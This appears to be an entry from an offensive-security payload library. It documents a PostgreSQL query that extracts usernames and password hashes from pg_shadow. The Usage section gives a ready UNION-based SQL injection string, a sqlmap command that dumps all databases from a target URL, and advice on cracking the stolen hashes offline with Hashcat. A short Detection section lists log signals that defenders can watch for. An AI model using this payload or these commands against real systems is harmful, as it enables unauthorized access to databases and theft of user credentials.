---
id: 8992b13b-4a6c-451a-b219-72aca9652d26
name: PostgreSQL-Extract-User-Hashes-from-pg_shadow
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:35.516751+00:00'
updated_at: '2023-04-10T20:23:12.882968+00:00'
platforms:
  - Database
tags:
  - postgresql
  - sql-injection
  - credential-access
validated: true
---

# PostgreSQL-Extract-User-Hashes-from-pg_shadow

## Code

```sql
SELECT usename, passwd FROM pg_shadow
```

## Description

This SQL code snippet queries the pg_shadow system table in PostgreSQL to extract usernames and their password hashes. It is a core payload for SQL injection attacks targeting database credential exposure, allowing attackers to obtain hashed passwords for offline cracking. The code is simple and direct, assuming execution context with sufficient privileges.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This query has no variables; it dumps all entries from pg_shadow. For customization, wrap in a subquery or add WHERE clauses externally. | N/A |

## Usage

Inject this query via a vulnerable web application parameter, e.g., in a UNION SELECT: `'; UNION SELECT usename, passwd FROM pg_shadow --`. Execute using tools like sqlmap (`sqlmap -u "http://target.com/search?q=1" --dbms=postgresql --dump-all`) or manual HTTP requests. Once extracted, save output to a file for cracking with Hashcat using modes for MD5 or SCRAM hashes.

## Detection

- Monitor PostgreSQL logs for SELECT queries on pg_shadow from application IPs.
- Web application logs showing anomalous UNION or stacked queries.
- Increased error rates from SQL syntax issues during injection attempts.
- Database alert rules for access to system catalogs by non-admin roles.

## Related

- [[procedures/PostgreSQL-Password-Hash-Extraction-via-SQL-Injection]]
- [[commands/postgresql-select-usename-passwd-from-pg_shadow]]
